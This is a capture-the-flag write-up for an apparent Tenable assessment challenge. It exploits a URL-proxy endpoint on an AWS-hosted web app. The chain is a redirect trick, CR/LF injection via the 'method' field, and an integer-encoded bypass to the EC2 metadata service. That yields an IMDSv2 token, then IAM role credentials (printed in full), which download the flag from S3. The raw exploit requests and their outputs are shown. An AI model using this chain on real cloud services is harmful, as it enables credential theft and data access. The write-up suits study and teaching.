# Tenable Zero Day Assessment - Challenge 3 Writeup - jiva

```
Challenge 3: Cloud Security
===
This challenge involves a cloud API similar to what you might encounter during a bug hunt. Find the flag in the format "FLAG{ xxxxx }"and write-up your approach.

Target : http://3.138.141.238/
Note: Brute-forcing and directory/file enumeration are not expected or required for the challenge.

Deliverables:
1. A write up describing how you approached the challenge and found the flag (if found).
2. The flag (if found).
```

For this challenge, we're given a link to a webapp that appears to be a UI for sending requests to endpoints that we specify.

![Image](./writeup_images/c3_main_page.png)

The links listed under "API Public Docs" send you to some resources hosted on AWS in an S3 bucket named "apitestdocs".

Peeking at the HTML source code, we see a few interesting things...

![Image](./writeup_images/c3_main_page_source.png)

Hidden in the comments is a call to a JavaScript function named `TestApi()`. We also see that the links that we clicked on earlier aren't your typical anchor link, and instead are calls to the JavaScript function named `GetDoc()`. Passed into this function are what appears to be resource paths. We also see a hard-coded base64 encoded key value which decodes to `{"TotallyRealTestKey":"THISISSECRET"}`.

Let's peek at test.js...

![Image](./writeup_images/c3_testjs.png)

Here we find the function definitions for the two functions we saw being called in the main HTML source.

`TestApi()` grabs values from input boxes `url` and `key`, and sends an AJAX POST request off to `/requester.php`. The data for the POST request is a JSON dictionary containing the specified `url` value, along with `key` which is stored under the key `X-API-Key`. The data is then JSON'd and sent off, and the response is stored into the value of a textarea tag.

`GetDoc()` takes an input `doc`, and passes that input into an AJAX GET request to `gets3doc.php?doc=`, passing in the variable into the GET variable `doc`.

Peeking at the output of `gets3doc.php`, we can see that it's essentially an endpoint that crafts a signed URL for requesting an S3 document that was specified by `doc`.

![Image](./writeup_images/c3_gets3doc.png)

Playing around with `requester.php`, as the name suggest, it's essentially an endpoint for proxying requests. We can test to this on a host we own to verify...

![Image](./writeup_images/c3_requester_test.png)

![Image](./writeup_images/c3_kegy_requester_test.png)

We can see the request coming from `3.138.141.238`.

Now that we have a lay of the land, let's think of our attack surface here. The following come to mind:
- Use `requester.php` to exploit a potential local file read vulnerability.
- Use `requester.php` to exploit a potential SSRF (Same-Site Request Forgery) vulnerability.
- Use `gets3doc.php` to craft signed URLs to resources we normally shouldn't be able to access.

***

Whenever I see a web application that proxies URLs, I always like to check to see if they're protecting against `file://` requests.

![Image](./writeup_images/c3_requster_file.png)

That fails. Looks like we might have tripped a validation check. Let's see if we can trick the server into following a 301 redirect that leads to the desired file path by using a simple PHP script hosted on our webserver.


![Image](./writeup_images/c3_kegy_ayylmao2.png)

![Image](./writeup_images/c3_requster_ayylmao2.png)

Looks the `file://` scheme has been disabled in libcurl.

***

Since it appears the IP is running on an Amazon EC2 instance, I want to try exploiting a potential SSRF vulnerability targeting AWS' internal metadata server.

Briefly put, Amazon AWS has a dedicated internal IP whose primary purpose is to provide instance metadata (such as the instance name, instance id, and potentially other sensitive data). This is known as the metadata service and is hosted at address `169.254.169.254`. 

Let's attempt to make a web request to this service using the requester service:

![Image](./writeup_images/c3_requester_metadata_ip_test.png)

We get a message saying "Disallowed url". Bummer.

Let's see if we can bypass this by using the 301 redirect trick.
```
jiva@kegy:/var/www/html$ cat ayylmao.php
<?php
header("Location: http://169.254.169.254", true, 301);
exit();
?>
```

![Image](./writeup_images/c3_requester_ayylmao_200.png)

Hmm. We don't see the output of the metadata service, but we also see that the request didn't fail or timeout (and responded with a 200 OK).

When I changed the metadata server IP to something else (e.g. something unresponsive), I observed that the request actually times out.
```
[28] Connection timed out after 20879 milliseconds
```
A similar thing happens when we convert the IP into an integer format (http://2852039166), we still get a 200 OK response but no output.

I assume this means the request is making its way to the metadata server, but something is interfering when displaying the response. Moving on.

While poking at `/requester.php`, I encountered a sanity check when attempt to inject CR/LFs into the `header`:

```
POST /requester.php HTTP/1.1
Host: 3.138.141.238
Content-Length: 71

{"url":"http://ke.gy/","method":"GET","header":"X-API-Key: \r\n\r\n"}
```
```
HTTP/1.1 200 OK
Date: Wed, 14 Jul 2021 01:21:42 GMT
Server: Apache
Upgrade: h2,h2c
Connection: Upgrade
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Content-Type: text/html; charset=UTF-8
Content-Length: 87

Bad header. Only headers beginning with X- and containing standard characters accepted.
```

However, I discovered that although the `header` variable is being filtered, the `method` variable isn't. We can easily inject CR/LF using this field and essentially define our own headers:
```
POST /requester.php HTTP/1.1
Host: 3.138.141.238
Content-Length: 166

{"url":"http://ke.gy/","method":"POST / HTTP/1.1\r\nayylmao: cool-custom-header\r\n\r\n","header":"X-API-Key: eyJUb3RhbGx5UmVhbFRlc3RLZXkiOiJUSElTSVNTRUNSRVQifQ=="
}
```
```
jiva@kegy:~$ sudo nc -v -l 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [3.138.141.238] port 80 [tcp/http] accepted (family 2, sport 41014)
POST / HTTP/1.1
ayylmao: cool-custom-header

 / HTTP/1.1
Host: ke.gy
Accept: */*
X-API-Key: eyJUb3RhbGx5UmVhbFRlc3RLZXkiOiJUSElTSVNTRUNSRVQifQ==
```

Keeping this trick in mind incase the need for it arises. Moving on.

[I found this cool article](https://blog.appsecco.com/server-side-request-forgery-ssrf-and-aws-ec2-instances-after-instance-meta-data-service-version-38fc1ba1a28a). It talks about how the new IMDSv2 (Instance Metadata Service v2) requires the request method to be `PUT` and for there to be custom headers attached to the request.

> The new Instance Metadata Service v2 (IMDSv2) tackles both of these conditions. IMDSv2 adds the following exploit mitigating changes to access the endpoint
> 1. The requirement of a HTTP header called x-aws-ec2-metadata-token that contains a value generated via a PUT request to http://169.254.169.254/latest/api/token
> 2. A PUT request to http://169.254.169.254/latest/api/token with the custom header x-aws-ec2-metadata-token-ttl-seconds with the value of the number of seconds for which the token needs to be active. This PUT request generates the token to be used in Step 1.

Hey, that sounds familiar. Let's try it out on our target using the IP-to-integer trick to bypass the filter.

```
POST /requester.php HTTP/1.1
Host: 3.138.141.238
Content-Length: 114

{"url":"http://2852039166/latest/api/token","method":"PUT","header":"X-aws-ec2-metadata-token-ttl-seconds: 300"
}
```
```
HTTP/1.1 200 OK
Date: Wed, 14 Jul 2021 02:24:14 GMT
Server: Apache
Upgrade: h2,h2c
Connection: Upgrade
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Content-Type: text/html; charset=UTF-8
Content-Length: 56

AQAEAHhnfPvJ6tOfXP9S-Km9tBmui0DU-JWBBTy_N6M5YhL8ly3Orw==
```
Sweet! We got a token. Let's use it to see if we can access the metadata service:
```
POST /requester.php HTTP/1.1
Host: 3.138.141.238
Content-Length: 155

{"url":"http://2852039166/latest/meta-data","method":"GET","header":"X-aws-ec2-metadata-token: AQAEAHhnfPvJ6tOfXP9S-Km9tBmui0DU-JWBBTy_N6M5YhL8ly3Orw=="
}
```
```
HTTP/1.1 200 OK
Date: Wed, 14 Jul 2021 02:31:24 GMT
Server: Apache
Upgrade: h2,h2c
Connection: Upgrade
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Content-Type: text/html; charset=UTF-8
Content-Length: 331

ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hibernation/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

Nice! Now let's see if we can nab some secret keys...
```
POST /requester.php HTTP/1.1
Host: 3.138.141.238
Content-Length: 187

{"url":"http://2852039166/latest/meta-data/iam/security-credentials/S3Role","method":"GET","header":"X-aws-ec2-metadata-token: AQAEAHhnfPvJ6tOfXP9S-Km9tBmui0DU-JWBBTy_N6M5YhL8ly3Orw=="
}
```
```
HTTP/1.1 200 OK
Date: Wed, 14 Jul 2021 02:33:37 GMT
Server: Apache
Upgrade: h2,h2c
Connection: Upgrade
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Content-Type: text/html; charset=UTF-8
Content-Length: 1310

{
  "Code" : "Success",
  "LastUpdated" : "2021-07-14T02:12:14Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA5HRVYIWQMC5E4DOL",
  "SecretAccessKey" : "g2/mPfn4aBLKvRUZGBbOYXLHvCIkLsMya95dLWZY",
  "Token" : "IQoJb3JpZ2luX2VjEBIaCXVzLWVhc3QtMiJIMEYCIQCfx03FbB2Rs/RfyYmgKOQOJCPFVkd9VJPv2/e63ZZPegIhAJhXlrA0DQLSkVAmqWnLqxO88JOr/mPSDtp8qhQt6dXxKoMECPv//////////wEQARoMOTA5NTcyMDY0NjcyIgwhq9XzI04wAZbSVh4q1wOiMvVdj48oheo7SbsWw0fUNqbJNKWT3J5S9ORLluuTevqoPX7uMsHtOrQr1kBEEosCeQfZunIo4Mi/FRHhdAQ13dGM1slMYdk9qAVOVOWdmQ5WL2ue/7uixFJMjpAnO+3+CLt6q9bCG2wxmQ9/SXWlufdooqap5RIBssn7BJv7cqFDtJcq2/ecv+KyDuhmswLaoJ5WjIYkjiAAu4U2LYv/kxsmOj48khpYgtV6j3+CtlqUga+N15yNKTWtqSrtUlPwqVaeOCLWkFbbZwo43/eOMMqabX61ltpqywe1tp6PWflm+JD5lcChOqYKcD22JzCQBb/Tq4EtHegFNkT5gUO078A43l73AZoKT7+fAFcFsFt8baMAxQNglXZ2xxdGxm8EpAJ5FGTTXR9CB2m2p19AMVHHb8ldKFnGnM2MDt0BXPLIPAWEP5NBmuJENVsjkGuA6niG8YBUaBrHDbOfAmj6y1+ahmaKqd029QEGtmyjNCbA2W9gPNVByHcjKXAFu2r+7fnjscV3CHibaNzX7mGEj1+cO0gjnKg+WcZ4UWQR1x9NeKXOZdpnSkxEE1lQFgAF6JruSIo+TTXaA4c6OQ+KCX7oJ/lXdU/Al1iduoI08U203bSG+aEw44+5hwY6pAE2O1Vsk8x5vThI+apHfZ6T1UZ5Tw8Alb2hyho2M5W8Lz3+j+/2skV4cl71BbfaC0WzcMQK1LfEzkEpB3RIFzYYcr+1P5JFQyml08wAp928Ux1EH4qY5Xe/ybNbpasfD+/AdeSvXJPpC958kQYgGi/mHa2qEdHXGqIb1Xabzv3RZ/LfR4Lj6Ra5zNMEiS35mfQF3wGTPg3XGyHjT0Z88/L1pJGWHw==",
  "Expiration" : "2021-07-14T08:17:39Z"
}
```

Aww yiss. Now let's use these creds to list what's in the S3 bucket we discovered from before.

```
ubuntu@ip-172-30-3-126:~$ export AWS_ACCESS_KEY_ID=ASIA5HRVYIWQMC5E4DOL
ubuntu@ip-172-30-3-126:~$ export AWS_SECRET_ACCESS_KEY=g2/mPfn4aBLKvRUZGBbOYXLHvCIkLsMya95dLWZY
ubuntu@ip-172-30-3-126:~$ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEBIaCXVzLWVhc3QtMiJIMEYCIQCfx03FbB2Rs/RfyYmgKOQOJCPFVkd9VJPv2/e63ZZPegIhAJhXlrA0DQLSkVAmqWnLqxO88JOr/mPSDtp8qhQt6dXxKoMECPv//////////wEQARoMOTA5NTcyMDY0NjcyIgwhq9XzI04wAZbSVh4q1wOiMvVdj48oheo7SbsWw0fUNqbJNKWT3J5S9ORLluuTevqoPX7uMsHtOrQr1kBEEosCeQfZunIo4Mi/FRHhdAQ13dGM1slMYdk9qAVOVOWdmQ5WL2ue/7uixFJMjpAnO+3+CLt6q9bCG2wxmQ9/SXWlufdooqap5RIBssn7BJv7cqFDtJcq2/ecv+KyDuhmswLaoJ5WjIYkjiAAu4U2LYv/kxsmOj48khpYgtV6j3+CtlqUga+N15yNKTWtqSrtUlPwqVaeOCLWkFbbZwo43/eOMMqabX61ltpqywe1tp6PWflm+JD5lcChOqYKcD22JzCQBb/Tq4EtHegFNkT5gUO078A43l73AZoKT7+fAFcFsFt8baMAxQNglXZ2xxdGxm8EpAJ5FGTTXR9CB2m2p19AMVHHb8ldKFnGnM2MDt0BXPLIPAWEP5NBmuJENVsjkGuA6niG8YBUaBrHDbOfAmj6y1+ahmaKqd029QEGtmyjNCbA2W9gPNVByHcjKXAFu2r+7fnjscV3CHibaNzX7mGEj1+cO0gjnKg+WcZ4UWQR1x9NeKXOZdpnSkxEE1lQFgAF6JruSIo+TTXaA4c6OQ+KCX7oJ/lXdU/Al1iduoI08U203bSG+aEw44+5hwY6pAE2O1Vsk8x5vThI+apHfZ6T1UZ5Tw8Alb2hyho2M5W8Lz3+j+/2skV4cl71BbfaC0WzcMQK1LfEzkEpB3RIFzYYcr+1P5JFQyml08wAp928Ux1EH4qY5Xe/ybNbpasfD+/AdeSvXJPpC958kQYgGi/mHa2qEdHXGqIb1Xabzv3RZ/LfR4Lj6Ra5zNMEiS35mfQF3wGTPg3XGyHjT0Z88/L1pJGWHw==
ubuntu@ip-172-30-3-126:~$ aws s3 ls s3://apitestdocs
                           PRE public/
2021-06-23 21:06:43         22 flag.txt
```

Ah-ha, `flag.txt`. Let's generate a presigned url and fetch it!

```
ubuntu@ip-172-30-3-126:~$ aws s3 presign s3://apitestdocs/public/flag.txt
https://apitestdocs.s3.amazonaws.com/public/flag.txt?AWSAccessKeyId=ASIA5HRVYIWQMC5E4DOL&Signature=zOC8PKD3jGX7UDOJFnzzQQlDEdA%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEBIaCXVzLWVhc3QtMiJIMEYCIQCfx03FbB2Rs%2FRfyYmgKOQOJCPFVkd9VJPv2%2Fe63ZZPegIhAJhXlrA0DQLSkVAmqWnLqxO88JOr%
2FmPSDtp8qhQt6dXxKoMECPv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMOTA5NTcyMDY0NjcyIgwhq9XzI04wAZbSVh4q1wOiMvVdj48oheo7SbsWw0fUNqbJNKWT3J5S9ORLluuTevqoPX7uMsHtOrQr1kBEEosCeQfZunIo4Mi%2FFRHhdAQ13dGM1slMYdk9qAVOVOWdmQ5WL2ue%2F7uixFJMjpAnO%2B3%2BCLt6q9bCG2wxmQ9%2FSXWlufdooqap5RIBs
sn7BJv7cqFDtJcq2%2Fecv%2BKyDuhmswLaoJ5WjIYkjiAAu4U2LYv%2FkxsmOj48khpYgtV6j3%2BCtlqUga%2BN15yNKTWtqSrtUlPwqVaeOCLWkFbbZwo43%2FeOMMqabX61ltpqywe1tp6PWflm%2BJD5lcChOqYKcD22JzCQBb%2FTq4EtHegFNkT5gUO078A43l73AZoKT7%2BfAFcFsFt8baMAxQNglXZ2xxdGxm8EpAJ5FGTTXR9CB2m2p19AMVHHb8ldKFn
GnM2MDt0BXPLIPAWEP5NBmuJENVsjkGuA6niG8YBUaBrHDbOfAmj6y1%2BahmaKqd029QEGtmyjNCbA2W9gPNVByHcjKXAFu2r%2B7fnjscV3CHibaNzX7mGEj1%2BcO0gjnKg%2BWcZ4UWQR1x9NeKXOZdpnSkxEE1lQFgAF6JruSIo%2BTTXaA4c6OQ%2BKCX7oJ%2FlXdU%2FAl1iduoI08U203bSG%2BaEw44%2B5hwY6pAE2O1Vsk8x5vThI%2BapHfZ6T1UZ5T
w8Alb2hyho2M5W8Lz3%2Bj%2B%2F2skV4cl71BbfaC0WzcMQK1LfEzkEpB3RIFzYYcr%2B1P5JFQyml08wAp928Ux1EH4qY5Xe%2FybNbpasfD%2B%2FAdeSvXJPpC958kQYgGi%2FmHa2qEdHXGqIb1Xabzv3RZ%2FLfR4Lj6Ra5zNMEiS35mfQF3wGTPg3XGyHjT0Z88%2FL1pJGWHw%3D%3D&Expires=1626235070
```

Hmm, I guess Amazon doesn't like this URL...

![Image](./writeup_images/c3_flag_presign_url_aws_issues.png)

Also, when I use `gets3doc.php` to generate the signed URL, I get another error:
```
<Error>
<Code>NoSuchKey</Code>
<Message>The specified key does not exist.</Message>
<Key>public/flag.txt</Key>
<RequestId>F551H8GJ23EBQ3J0</RequestId>
<HostId>tfE/J/8YhWK7x+87ZxOqW1poVY2QExk/PJtMNce1Z+w0EXCSmJDq9/aJ29GC7R0fQJbR3PrRcyc=</HostId>
</Error>
```

Back to Googling...

OKAY, so apparently Amazon doesn't like certain authorization mechanisms depending on what region you're in. _wack_. Trying this another way...

OKAY, I wrote a python script using boto3:
```
ubuntu@ip-172-30-3-126:~$ cat s3.py
from botocore.client import Config
import boto3

s3 = boto3.client(
    's3',
    aws_access_key_id='ASIA5HRVYIWQMC5E4DOL',
    aws_secret_access_key='g2/mPfn4aBLKvRUZGBbOYXLHvCIkLsMya95dLWZY',
    aws_session_token='IQoJb3JpZ2luX2VjEBIaCXVzLWVhc3QtMiJIMEYCIQCfx03FbB2Rs/RfyYmgKOQOJCPFVkd9VJPv2/e63ZZPegIhAJhXlrA0DQLSkVAmqWnLqxO88JOr/mPSDtp8qhQt6dXxKoMECPv//////////wEQARoMOTA5NTcyMDY0NjcyIgwhq9XzI04wAZbSVh4q1wOiMvVdj48oheo7SbsWw0fUNqbJNKWT3J5S9ORLluuTevqoPX7uMsHtOrQr1kBEEosCeQfZunIo4Mi/FRHhdAQ13dGM1slMYdk9qAVOVOWdmQ5WL2ue/7uixFJMjpAnO+3+CLt6q9bCG2wxmQ9/SXWlufdooqap5RIBssn7BJv7cqFDtJcq2/ecv+KyDuhmswLaoJ5WjIYkjiAAu4U2LYv/kxsmOj48khpYgtV6j3+CtlqUga+N15yNKTWtqSrtUlPwqVaeOCLWkFbbZwo43/eOMMqabX61ltpqywe1tp6PWflm+JD5lcChOqYKcD22JzCQBb/Tq4EtHegFNkT5gUO078A43l73AZoKT7+fAFcFsFt8baMAxQNglXZ2xxdGxm8EpAJ5FGTTXR9CB2m2p19AMVHHb8ldKFnGnM2MDt0BXPLIPAWEP5NBmuJENVsjkGuA6niG8YBUaBrHDbOfAmj6y1+ahmaKqd029QEGtmyjNCbA2W9gPNVByHcjKXAFu2r+7fnjscV3CHibaNzX7mGEj1+cO0gjnKg+WcZ4UWQR1x9NeKXOZdpnSkxEE1lQFgAF6JruSIo+TTXaA4c6OQ+KCX7oJ/lXdU/Al1iduoI08U203bSG+aEw44+5hwY6pAE2O1Vsk8x5vThI+apHfZ6T1UZ5Tw8Alb2hyho2M5W8Lz3+j+/2skV4cl71BbfaC0WzcMQK1LfEzkEpB3RIFzYYcr+1P5JFQyml08wAp928Ux1EH4qY5Xe/ybNbpasfD+/AdeSvXJPpC958kQYgGi/mHa2qEdHXGqIb1Xabzv3RZ/LfR4Lj6Ra5zNMEiS35mfQF3wGTPg3XGyHjT0Z88/L1pJGWHw==',
    config=Config(signature_version='s3v4')
)

s3.download_file('apitestdocs', 'flag.txt', 'flag.txt')
```
```
ubuntu@ip-172-30-3-126:~$ cat flag.txt
FLAG{Buckets_0f_data}
```
